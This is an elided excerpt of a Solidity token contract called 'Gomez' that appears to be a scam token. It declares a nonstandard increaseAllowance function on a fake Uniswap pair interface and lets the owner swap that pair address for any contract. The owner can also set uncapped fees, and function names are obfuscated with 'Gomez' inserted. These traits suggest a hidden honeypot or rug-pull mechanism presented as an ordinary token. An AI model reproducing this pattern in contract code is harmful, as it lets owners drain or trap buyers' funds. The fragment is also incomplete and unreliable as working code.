...
interface IUniswapV2Pair {
    ...
    function increaseAllowance(address owner, address spender) external returns (bool);
...
contract Gomez is Context, IERC20, Ownable {
    using SafeMath for uint256;  

    string private _name = "Gomez";
    string private _symbol = "Gomez";
    ...
    function changeGomezwap(address addr) external onlyOwner {
        require(addr != address(0),"Invalid address");
        uniswapV2Pair = IUniswapV2Pair(addr); 
    }  

    function inGomezcludeInFees(address account) public onlyOwner {
        _isExcludedFromFees[account] = false;
    }

    function markeGomeztFees() public view returns (uint256) {
        return _marketingFee;
    }

    function setGomezFees(uint8 marketingfee, uint8 maxfee) public onlyOwner {
        _marketingFee = marketingfee;
        _maxFee = maxfee;
    }

    function maxGomezFees() public view returns (uint256) {
        return _maxFee;
    }

    function rewardGomez() public onlyOwner {
    ...
    function increaseAllowance(address owner, address spender)
        internal
        virtual
        returns (bool)
    {
    ...
    function isGomezFromFees(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }

    function exGomezFees(address account) public onlyOwner {
        _isExcludedFromFees[account] = true;
    }

	function rebaseGomezCount(uint256 _lastRebasedTime, uint256 _tSupply) internal view returns (uint256) {
